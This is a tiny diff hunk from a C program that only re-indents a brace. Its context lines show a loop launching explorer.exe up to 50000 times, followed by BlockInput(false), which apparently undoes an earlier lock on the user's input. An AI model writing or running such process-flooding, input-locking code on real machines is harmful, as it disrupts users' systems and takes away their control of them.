@@ -22,7 +22,7 @@ int main() {
 	while (*x < 50000) {
 	system("explorer.exe");
 	(*x)++;
-}
+	}
 	BlockInput(false);
 	free(x);
 	return 0;
